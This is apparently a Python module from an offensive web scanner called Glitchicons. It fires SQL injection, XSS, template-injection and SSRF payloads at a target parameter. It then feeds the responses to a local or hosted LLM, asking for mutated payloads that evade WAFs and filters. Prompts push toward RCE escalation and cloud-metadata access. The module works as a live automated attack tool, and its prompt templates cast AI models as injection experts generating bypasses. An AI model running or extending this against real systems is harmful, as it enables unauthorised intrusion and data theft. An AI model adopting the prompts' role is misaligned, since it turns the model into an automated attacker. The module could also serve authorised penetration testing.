"""
LLM Payload Mutation Loop — modules/intelligence/llm_mutator.py

Transforms Glitchicons from a static scanner into an adaptive attacker.

How it works:
  1. Start with a base payload (e.g., "' OR '1'='1")
  2. Send to target, capture response (status, body, headers, timing)
  3. Feed response + payload to LLM: "what mutation would be more effective?"
  4. LLM generates N mutated payloads based on observed behavior
  5. Repeat until finding confirmed or max_rounds reached

Mutation strategies (LLM-guided):
  - SQLi: adapt to detected DB engine (MySQL/PostgreSQL/Oracle/MSSQL)
  - XSS: bypass detected filters (WAF patterns, sanitization)
  - SSTI: try different template engine syntax
  - SSRF: adapt bypass to observed redirect/block behavior
  - Generic: encoding mutations (URL, base64, unicode, hex)

Supports:
  - Ollama (local, default)
  - Claude API (via ANTHROPIC_API_KEY)
  - OpenAI (via OPENAI_API_KEY)

Usage:
    from modules.intelligence.llm_mutator import LLMMutator

    mutator = LLMMutator(provider="ollama", model="qwen2.5-coder:3b")
    result = mutator.mutate_and_test(
        target_url="https://target.com/search",
        param="q",
        base_payload="' OR '1'='1",
        attack_type="sqli",
        max_rounds=5,
    )

Author: ardanov96
"""

import json
import time
import httpx
from datetime import datetime
from pathlib import Path
from dataclasses import dataclass, field
from rich.console import Console

console = Console()


# ── Response snapshot ─────────────────────────────────────

@dataclass
class ResponseSnapshot:
    """Captures key signals from an HTTP response for LLM analysis."""
    payload: str
    status_code: int
    response_time_ms: float
    body_length: int
    body_snippet: str          # first 500 chars
    headers: dict
    error_keywords: list[str]  # SQL errors, stack traces, etc.
    reflection_found: bool     # payload reflected in body
    redirect_location: str

    def to_llm_context(self) -> str:
        """Format as context string for LLM prompt."""
        return (
            f"Payload: {self.payload}\n"
            f"Status: {self.status_code}\n"
            f"Response time: {self.response_time_ms:.0f}ms\n"
            f"Body length: {self.body_length}\n"
            f"Body snippet: {self.body_snippet[:300]}\n"
            f"Error keywords found: {self.error_keywords}\n"
            f"Payload reflected: {self.reflection_found}\n"
            f"Redirect: {self.redirect_location or 'none'}"
        )


@dataclass
class MutationResult:
    """Result of a full mutation loop run."""
    attack_type: str
    target_url: str
    param: str
    rounds_run: int
    payloads_tried: list[str]
    successful_payload: str | None
    snapshots: list[ResponseSnapshot]
    finding: dict | None
    total_time_s: float

    @property
    def success(self) -> bool:
        return self.successful_payload is not None


# ── Prompt templates ──────────────────────────────────────

MUTATION_PROMPTS = {
    "sqli": """You are a SQL injection expert. Analyze this HTTP response and generate 5 mutated SQL injection payloads.

Target: {target_url}
Parameter: {param}
Previous attempt context:
{context}

Rules:
- Generate exactly 5 payloads, one per line
- No explanations, no numbering, just the payloads
- Adapt to the database engine if error messages reveal it
- Try different comment styles (--, #, /*, %00)
- Try different quote styles (', ", ``)
- Try encoding if reflection is blocked
- Try time-based if error-based is filtered
- Each payload must be different from previous attempts

Output format: one payload per line, nothing else.""",

    "xss": """You are an XSS expert. Analyze this HTTP response and generate 5 mutated XSS payloads.

Target: {target_url}
Parameter: {param}
Previous attempt context:
{context}

Rules:
- Generate exactly 5 payloads, one per line
- No explanations, no numbering, just the payloads
- If reflection found, try breaking out of current HTML context
- Try different event handlers (onerror, onload, onfocus, onmouseover)
- Try HTML encoding, URL encoding, unicode encoding
- Try DOM-based vectors if page uses JavaScript
- Try SVG, MathML, or template literals if script tags blocked
- Try double-encoding or mixed case to bypass filters

Output format: one payload per line, nothing else.""",

    "ssti": """You are a template injection expert. Analyze this HTTP response and generate 5 mutated SSTI payloads.

Target: {target_url}
Parameter: {param}
Previous attempt context:
{context}

Rules:
- Generate exactly 5 payloads, one per line
- No explanations, no numbering, just the payloads
- Try different template engine syntax (Jinja2, Twig, Smarty, Freemarker, Velocity)
- Start with math probes: {{7*7}}, ${7*7}, #{7*7}
- If engine identified, try escalating to RCE
- Try bypasses: {{7*'7'}}, {{'7'*7}}, {{config.__class__}}
- Try filter bypasses with Unicode or string concatenation

Output format: one payload per line, nothing else.""",

    "ssrf": """You are an SSRF expert. Analyze this HTTP response and generate 5 mutated SSRF payloads.

Target: {target_url}
Parameter: {param}
Previous attempt context:
{context}

Rules:
- Generate exactly 5 payloads, one per line
- No explanations, no numbering, just the payloads
- Try different localhost representations: 127.0.0.1, localhost, 0.0.0.0, [::1], 0177.0.0.1
- Try cloud metadata: 169.254.169.254 (AWS), metadata.google.internal (GCP)
- Try URL schemes: http://, https://, gopher://, dict://, file://
- Try redirect chains if direct blocked
- Try URL encoding, double encoding, IP obfuscation (decimal, hex, octal)

Output format: one payload per line, nothing else.""",

    "generic": """You are a security researcher. Analyze this HTTP response and generate 5 mutated attack payloads.

Attack type: {attack_type}
Target: {target_url}
Parameter: {param}
Previous attempt context:
{context}

Rules:
- Generate exactly 5 payloads, one per line
- No explanations, no numbering, just the payloads
- Vary encoding: URL encode, base64, hex, unicode
- Try null bytes, special chars, boundary values
- Adapt based on what the server revealed

Output format: one payload per line, nothing else.""",
}

# Error/success signal keywords
SQLI_ERRORS = [
    "syntax error", "mysql", "postgresql", "ora-", "sqlite",
    "mssql", "unclosed quotation", "unterminated string",
    "you have an error in your sql", "warning: mysql",
]

XSS_SUCCESS = [
    "<script>", "onerror=", "onload=", "javascript:",
    "alert(", "confirm(", "prompt(",
]

SSTI_SUCCESS_PATTERN = "49"  # 7*7

SSRF_SUCCESS = [
    "ami-id", "instance-id", "computeMetadata", "aws",
    "root:", "uid=", "/etc/passwd",
]


# ── LLM client ────────────────────────────────────────────

class LLMClient:
    """
    Thin LLM client supporting Ollama, Anthropic, and OpenAI.
    All providers return plain text mutation suggestions.
    """

    def __init__(
        self,
        provider: str = "ollama",
        model: str = "qwen2.5-coder:3b",
        api_key: str | None = None,
        base_url: str = "http://localhost:11434",
    ):
        self.provider = provider.lower()
        self.model = model
        self.api_key = api_key
        self.base_url = base_url.rstrip("/")

    def generate(self, prompt: str, max_tokens: int = 500) -> str:
        """Generate text from LLM. Return raw text response."""
        if self.provider == "ollama":
            return self._ollama(prompt, max_tokens)
        elif self.provider == "anthropic":
            return self._anthropic(prompt, max_tokens)
        elif self.provider == "openai":
            return self._openai(prompt, max_tokens)
        else:
            raise ValueError(f"Unknown LLM provider: {self.provider}")

    def _ollama(self, prompt: str, max_tokens: int) -> str:
        try:
            resp = httpx.post(
                f"{self.base_url}/api/generate",
                json={
                    "model": self.model,
                    "prompt": prompt,
                    "stream": False,
                    "options": {"num_predict": max_tokens, "temperature": 0.8},
                },
                timeout=60,
            )
            resp.raise_for_status()
            return resp.json().get("response", "")
        except Exception as e:
            console.print(f"  [yellow]Ollama error: {e}[/yellow]")
            return ""

    def _anthropic(self, prompt: str, max_tokens: int) -> str:
        try:
            resp = httpx.post(
                "https://api.anthropic.com/v1/messages",
                headers={
                    "x-api-key": self.api_key or "",
                    "anthropic-version": "2023-06-01",
                    "content-type": "application/json",
                },
                json={
                    "model": self.model,
                    "max_tokens": max_tokens,
                    "messages": [{"role": "user", "content": prompt}],
                },
                timeout=30,
            )
            resp.raise_for_status()
            return resp.json()["content"][0]["text"]
        except Exception as e:
            console.print(f"  [yellow]Anthropic error: {e}[/yellow]")
            return ""

    def _openai(self, prompt: str, max_tokens: int) -> str:
        try:
            resp = httpx.post(
                "https://api.openai.com/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {self.api_key or ''}",
                    "Content-Type": "application/json",
                },
                json={
                    "model": self.model,
                    "messages": [{"role": "user", "content": prompt}],
                    "max_tokens": max_tokens,
                    "temperature": 0.8,
                },
                timeout=30,
            )
            resp.raise_for_status()
            return resp.json()["choices"][0]["message"]["content"]
        except Exception as e:
            console.print(f"  [yellow]OpenAI error: {e}[/yellow]")
            return ""

    def parse_payloads(self, llm_output: str) -> list[str]:
        """Parse LLM output into list of payloads (one per line)."""
        lines = llm_output.strip().splitlines()
        payloads = []
        for line in lines:
            line = line.strip()
            # Skip empty, numbered lists, explanations
            if not line:
                continue
            if line[0].isdigit() and len(line) > 2 and line[1] in ".):":
                line = line[2:].strip()
            if len(line) > 1:
                payloads.append(line)
        return payloads[:10]  # max 10 per round

    def is_available(self) -> bool:
        """Check if LLM provider is reachable."""
        if self.provider == "ollama":
            try:
                resp = httpx.get(f"{self.base_url}/api/tags", timeout=3)
                return resp.status_code == 200
            except Exception:
                return False
        return bool(self.api_key)


# ── HTTP prober ───────────────────────────────────────────

class HTTPProber:
    """Sends payloads to target and captures response signals."""

    def __init__(self, timeout: int = 10, delay: float = 0.3):
        self.timeout = timeout
        self.delay = delay

    def probe(
        self,
        url: str,
        param: str,
        payload: str,
        method: str = "GET",
        headers: dict | None = None,
    ) -> ResponseSnapshot:
        """Send payload and return ResponseSnapshot."""
        req_headers = {
            "User-Agent": "Mozilla/5.0 (Glitchicons LLM Mutator)",
        }
        if headers:
            req_headers.update(headers)

        start = time.time()
        try:
            if method.upper() == "GET":
                resp = httpx.get(
                    url,
                    params={param: payload},
                    headers=req_headers,
                    timeout=self.timeout,
                    follow_redirects=True,
                )
            else:
                resp = httpx.post(
                    url,
                    data={param: payload},
                    headers=req_headers,
                    timeout=self.timeout,
                    follow_redirects=True,
                )

            elapsed = (time.time() - start) * 1000
            body = resp.text
            body_lower = body.lower()

            errors = [kw for kw in SQLI_ERRORS if kw in body_lower]
            reflected = payload.lower() in body_lower
            redirect = str(resp.headers.get("location", ""))

            return ResponseSnapshot(
                payload=payload,
                status_code=resp.status_code,
                response_time_ms=elapsed,
                body_length=len(body),
                body_snippet=body[:500],
                headers=dict(resp.headers),
                error_keywords=errors,
                reflection_found=reflected,
                redirect_location=redirect,
            )

        except httpx.TimeoutException:
            elapsed = (time.time() - start) * 1000
            return ResponseSnapshot(
                payload=payload,
                status_code=0,
                response_time_ms=elapsed,
                body_length=0,
                body_snippet="[TIMEOUT]",
                headers={},
                error_keywords=[],
                reflection_found=False,
                redirect_location="",
            )
        except Exception as e:
            return ResponseSnapshot(
                payload=payload,
                status_code=0,
                response_time_ms=0,
                body_length=0,
                body_snippet=f"[ERROR: {e}]",
                headers={},
                error_keywords=[],
                reflection_found=False,
                redirect_location="",
            )


# ── Success detectors ─────────────────────────────────────

class SuccessDetector:
    """Determines if a payload succeeded based on response signals."""

    @staticmethod
    def sqli(snapshot: ResponseSnapshot) -> bool:
        body_lower = snapshot.body_snippet.lower()
        # Error-based
        if snapshot.error_keywords:
            return True
        # Time-based (>3s response)
        if snapshot.response_time_ms > 3000:
            return True
        # Union-based (unusual content length change)
        return False

    @staticmethod
    def xss(snapshot: ResponseSnapshot) -> bool:
        body_lower = snapshot.body_snippet.lower()
        return (
            snapshot.reflection_found
            and any(sig in body_lower for sig in XSS_SUCCESS)
        )

    @staticmethod
    def ssti(snapshot: ResponseSnapshot) -> bool:
        return SSTI_SUCCESS_PATTERN in snapshot.body_snippet

    @staticmethod
    def ssrf(snapshot: ResponseSnapshot) -> bool:
        body_lower = snapshot.body_snippet.lower()
        return any(sig in body_lower for sig in SSRF_SUCCESS)

    @classmethod
    def detect(cls, attack_type: str, snapshot: ResponseSnapshot) -> bool:
        detectors = {
            "sqli":  cls.sqli,
            "xss":   cls.xss,
            "ssti":  cls.ssti,
            "ssrf":  cls.ssrf,
        }
        fn = detectors.get(attack_type, lambda s: False)
        return fn(snapshot)


# ── Main mutator ──────────────────────────────────────────

class LLMMutator:
    """
    Adaptive payload mutator — uses LLM feedback loop to evolve payloads.

    Each round:
      1. Send current payload → capture response
      2. Build LLM prompt from payload + response context
      3. LLM generates N mutations based on observed behavior
      4. Test mutations, update context
      5. If success → stop; else → next round
    """

    def __init__(
        self,
        provider: str = "ollama",
        model: str = "qwen2.5-coder:3b",
        api_key: str | None = None,
        ollama_url: str = "http://localhost:11434",
        output_dir: str = "./findings/mutations",
        request_delay: float = 0.5,
        request_timeout: int = 10,
    ):
        self.llm = LLMClient(
            provider=provider,
            model=model,
            api_key=api_key,
            base_url=ollama_url,
        )
        self.prober = HTTPProber(timeout=request_timeout, delay=request_delay)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def mutate_and_test(
        self,
        target_url: str,
        param: str,
        base_payload: str,
        attack_type: str = "sqli",
        max_rounds: int = 5,
        method: str = "GET",
        headers: dict | None = None,
    ) -> MutationResult:
        """
        Run adaptive mutation loop.

        Args:
            target_url:   Full URL of target endpoint
            param:        Parameter name to inject into
            base_payload: Starting payload
            attack_type:  sqli | xss | ssti | ssrf | generic
            max_rounds:   Max LLM feedback iterations
            method:       HTTP method (GET or POST)
            headers:      Additional HTTP headers

        Returns:
            MutationResult with all attempts and final finding
        """
        start_time = time.time()
        all_payloads = [base_payload]
        all_snapshots = []
        tried = set()

        console.print(f"\n[bold cyan]  LLM Mutation Loop[/bold cyan]")
        console.print(f"  Target    : [yellow]{target_url}[/yellow]")
        console.print(f"  Param     : {param}")
        console.print(f"  Attack    : {attack_type}")
        console.print(f"  LLM       : {self.llm.provider}/{self.llm.model}")
        console.print(f"  Max rounds: {max_rounds}\n")

        # Check LLM availability
        if not self.llm.is_available():
            console.print(
                f"  [yellow]LLM not available ({self.llm.provider}). "
                f"Running without mutation — testing base payload only.[/yellow]"
            )
            snapshot = self.prober.probe(target_url, param, base_payload, method, headers)
            all_snapshots.append(snapshot)
            success = SuccessDetector.detect(attack_type, snapshot)
            return MutationResult(
                attack_type=attack_type,
                target_url=target_url,
                param=param,
                rounds_run=0,
                payloads_tried=[base_payload],
                successful_payload=base_payload if success else None,
                snapshots=all_snapshots,
                finding=self._make_finding(base_payload, snapshot, attack_type) if success else None,
                total_time_s=time.time() - start_time,
            )

        current_payloads = [base_payload]
        last_snapshot = None

        for round_num in range(1, max_rounds + 1):
            console.print(f"  [cyan]Round {round_num}/{max_rounds}:[/cyan] {len(current_payloads)} payload(s)")

            round_success = None

            for payload in current_payloads:
                if payload in tried:
                    continue
                tried.add(payload)

                snapshot = self.prober.probe(target_url, param, payload, method, headers)
                all_snapshots.append(snapshot)
                all_payloads.append(payload)
                last_snapshot = snapshot

                time.sleep(self.prober.delay)

                if SuccessDetector.detect(attack_type, snapshot):
                    console.print(f"  [green]SUCCESS: {payload[:60]}[/green]")
                    round_success = payload
                    break
                else:
                    console.print(
                        f"  [dim]  {snapshot.status_code} | "
                        f"{snapshot.response_time_ms:.0f}ms | "
                        f"errors:{len(snapshot.error_keywords)} | "
                        f"reflect:{snapshot.reflection_found}[/dim]"
                    )

            if round_success:
                finding = self._make_finding(round_success, last_snapshot, attack_type)
                result = MutationResult(
                    attack_type=attack_type,
                    target_url=target_url,
                    param=param,
                    rounds_run=round_num,
                    payloads_tried=list(tried),
                    successful_payload=round_success,
                    snapshots=all_snapshots,
                    finding=finding,
                    total_time_s=time.time() - start_time,
                )
                self._save_result(result)
                return result

            # Generate next round of mutations via LLM
            if round_num < max_rounds and last_snapshot:
                console.print(f"  [cyan]  Asking LLM for mutations...[/cyan]")
                current_payloads = self._get_llm_mutations(
                    target_url=target_url,
                    param=param,
                    attack_type=attack_type,
                    snapshot=last_snapshot,
                    tried=tried,
                )
                console.print(f"  [cyan]  Got {len(current_payloads)} mutation(s)[/cyan]")

        result = MutationResult(
            attack_type=attack_type,
            target_url=target_url,
            param=param,
            rounds_run=max_rounds,
            payloads_tried=list(tried),
            successful_payload=None,
            snapshots=all_snapshots,
            finding=None,
            total_time_s=time.time() - start_time,
        )
        console.print(f"  [yellow]No bypass found after {max_rounds} rounds[/yellow]")
        self._save_result(result)
        return result

    def _get_llm_mutations(
        self,
        target_url: str,
        param: str,
        attack_type: str,
        snapshot: ResponseSnapshot,
        tried: set,
    ) -> list[str]:
        """Ask LLM to generate mutated payloads based on response context."""
        prompt_template = MUTATION_PROMPTS.get(attack_type, MUTATION_PROMPTS["generic"])
        prompt = prompt_template.format(
            target_url=target_url,
            param=param,
            attack_type=attack_type,
            context=snapshot.to_llm_context(),
        )

        llm_output = self.llm.generate(prompt, max_tokens=400)
        payloads = self.llm.parse_payloads(llm_output)

        # Filter already-tried payloads
        return [p for p in payloads if p not in tried][:5]

    def _make_finding(
        self,
        payload: str,
        snapshot: ResponseSnapshot,
        attack_type: str,
    ) -> dict:
        """Create a finding dict from a successful mutation."""
        severity_map = {
            "sqli": ("CRITICAL", 9.8, "CWE-89"),
            "xss":  ("HIGH",     7.5, "CWE-79"),
            "ssti": ("CRITICAL", 9.0, "CWE-94"),
            "ssrf": ("HIGH",     8.6, "CWE-918"),
        }
        sev, cvss, cwe = severity_map.get(attack_type, ("HIGH", 7.5, "CWE-74"))

        return {
            "id":          f"MUT-001",
            "title":       f"LLM-Evolved {attack_type.upper()} Payload Confirmed",
            "severity":    sev,
            "cvss":        cvss,
            "cwe":         cwe,
            "target":      snapshot.body_snippet[:50],
            "payload":     payload,
            "description": (
                f"LLM mutation loop confirmed {attack_type.upper()} vulnerability. "
                f"Successful payload: {payload[:100]}. "
                f"Response: HTTP {snapshot.status_code}, "
                f"{snapshot.response_time_ms:.0f}ms, "
                f"errors: {snapshot.error_keywords}."
            ),
            "evidence": snapshot.to_llm_context(),
            "remediation": (
                f"Sanitize and validate all user input before processing. "
                f"Use parameterized queries for {attack_type}. "
                f"Implement WAF rules targeting this payload pattern."
            ),
            "timestamp": datetime.now().isoformat(),
        }

    def _save_result(self, result: MutationResult):
        """Save mutation result to JSON."""
        data = {
            "tool":              "glitchicons",
            "module":            "llm_mutator",
            "version":           "0.9.0",
            "attack_type":       result.attack_type,
            "target_url":        result.target_url,
            "param":             result.param,
            "llm_provider":      self.llm.provider,
            "llm_model":         self.llm.model,
            "rounds_run":        result.rounds_run,
            "total_payloads":    len(result.payloads_tried),
            "success":           result.success,
            "successful_payload": result.successful_payload,
            "total_time_s":      round(result.total_time_s, 2),
            "finding":           result.finding,
            "payloads_tried":    result.payloads_tried,
            "snapshots": [
                {
                    "payload":          s.payload,
                    "status":           s.status_code,
                    "time_ms":          round(s.response_time_ms, 1),
                    "body_length":      s.body_length,
                    "errors":           s.error_keywords,
                    "reflected":        s.reflection_found,
                }
                for s in result.snapshots
            ],
        }
        slug = result.attack_type
        out = self.output_dir / f"mutation_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out.write_text(json.dumps(data, indent=2, default=str), encoding="utf-8")
        console.print(f"  Saved: [cyan]{out}[/cyan]")
